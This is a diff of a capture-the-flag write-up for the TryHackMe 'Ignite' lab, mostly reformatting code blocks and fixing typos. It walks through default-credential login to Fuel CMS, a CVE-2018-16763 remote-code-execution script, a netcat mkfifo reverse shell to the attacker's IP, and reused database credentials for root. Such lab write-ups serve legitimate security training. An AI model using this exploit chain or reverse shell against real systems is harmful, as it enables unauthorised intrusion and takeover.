@@ -6,23 +6,22 @@ categories:
   - TryHackMe
 ---
 
-<img src="ignite.png" alt="ignite" width=200/>
+{{< post-img src="ignite.png" alt="ignite" style="width: 200px;" >}}
 
 ## Enumeration
 
-### nmap
-```
+```bash
 PORT   STATE SERVICE REASON  VERSION
 80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
 |_http-server-header: Apache/2.4.18 (Ubuntu)
-| http-robots.txt: 1 disallowed entry 
+| http-robots.txt: 1 disallowed entry
 |_/fuel/
-| http-methods: 
+| http-methods:
 |_  Supported Methods: HEAD OPTIONS
 
 ```
-### ffuf
-```
+
+```bash
 0                       [Status: 200, Size: 16595, Words: 770, Lines: 232]
 .htaccess               [Status: 403, Size: 296, Words: 22, Lines: 12]
 assets                  [Status: 301, Size: 313, Words: 20, Lines: 10]
@@ -39,9 +38,9 @@ Well only port 80 is open...we know its the website enumeration or nothing
 
 `Fuel CMS version 1.4`
 
-That was in plain sight..wait they litteraly show the CMS instalation documentation
+That was in plain sight..wait they literally show the CMS installation documentation
 
-```
+```bash
 To access the FUEL admin, go to:
 http://10.10.74.189/fuel
 User name: admin
@@ -51,8 +50,8 @@ yeah actually the default credentials work
 
 In dashboard I tried to create a page with php shellcode but I couldnt access it
 
-````
-There is an updated view file located at 
+````bash
+There is an updated view file located at
 /var/www/html/fuel/application/views/home.php.
 Would you like to upload it into the body of your page (if available)?
 ````
@@ -60,16 +59,12 @@ Would you like to upload it into the body of your page (if available)?
 I tried to upload too but many php extension variants are not allowed
 
 Let's just search an exploit then
-
 We found `CVE-2018-16763`
-
-there were many exploitdb scripts for that but the 3rd exploit was the best 
-
+there were many exploitdb scripts for that but the 3rd exploit was the best
 It was for python3 so I chose that one as `50477.py`
-
 The script just takes the baseurl as argument
 
-```
+```bash
 └──╼ $python 50477.py -u http://10.10.140.103
 [+]Connecting...
 Enter Command $id
@@ -77,40 +72,38 @@ systemuid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 After playing with basic commands I can spawn a netcat shell with this payload
 
-```
+```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.226.203 2311 >/tmp/f
 ```
 
 Then I get access on my listenner
 
-```
+```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 I get simple python tty before grabbing first flag
 
-```
+```bash
 www-data@ubuntu:/home/www-data$ cat flag.txt
 cat flag.txt
 
 ```
 
-## Priilege Escalation
+## Privilege Escalation
 
 this part was not too hard because I knew after reading the website documentation
-
-And as there is no real user on machine anyway its all about the CMS instalation
-
+And as there is no real user on machine anyway its all about the CMS installation
 I knew I would check for php config files
 
-```
+```text
 Install the FUEL CMS database by first creating the database in MySQL and then importing the fuel/install/fuel_schema.sql file.
-After creating the database, change the database configuration found in fuel/application/config/database.php to include your hostname (e.g. localhost), username, password and the database 
+After creating the database, change the database configuration found in fuel/application/config/database.php to include your hostname (e.g. localhost), username, password and the database
 to match the new database you created.
 ```
 
 We go where the file is and read it
 
-```
+```bash
 www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php
 cat database.php
 <?php
@@ -221,12 +214,12 @@ In the last parts of the file we can see the database is setup with root credent
 
 I guess the credentials work for the system so I use them to go root
 
-```
+```bash
 www-data@ubuntu:/var/www/html/fuel/application/config$ su root
 su root
 Password: mememe
 
-root@ubuntu:/var/www/html/fuel/application/config# 
+root@ubuntu:/var/www/html/fuel/application/config#
 
 root@ubuntu:~# cat root.txt
 cat root.txt
